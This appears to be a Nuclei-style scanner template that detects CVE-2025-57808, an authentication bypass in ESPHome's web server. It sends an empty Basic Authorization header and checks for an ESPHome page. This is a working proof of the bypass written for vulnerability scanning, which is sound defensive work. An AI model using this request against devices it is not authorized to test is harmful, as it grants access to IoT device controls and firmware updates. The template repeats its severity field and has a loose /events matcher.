id: cve-2025-57808

info:
  name: ESPHome Web Server Authentication Bypass (CVE-2025-57808)
  author: sean-kim (adapted by ChatGPT)
  severity: high
  description: |
    ESP-IDF web_server's basic auth check can be bypassed when the client-supplied Base64 Authorization value is empty or a prefix of the correct value. An attacker on the same network can access web_server functions (including OTA if enabled) without knowing credentials. Patched in esphome 2025.8.1.
  reference:
    - "https://github.com/esphome/esphome/security/advisories/GHSA-mxh2-ccgj-8635"
    - "https://cybersecuritynews.com/esphome-web-server-authentication-bypass/"
    - "https://esphome.io/components/web_server/"
  tags: 
    - esphome
    - iot
    - cve-2025-57808
    - webserver
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}/"
    headers:
      Authorization: "Basic "
    max-redirects: 0
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "esphome"
          - "ESPHome"
        part: body
        case-insensitive: true
    extractors:
      - type: regex
        name: server_header
        part: header
        regex:
          - "(?i)server:\\s*(.*)"
      - type: regex
        name: title
        part: body
        regex:
          - "<title[^>]*>([^<]+)</title>"

  - method: GET
    path:
      - "{{BaseURL}}/events"
    max-redirects: 0
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "event"
          - "events"
        part: body
        case-insensitive: true
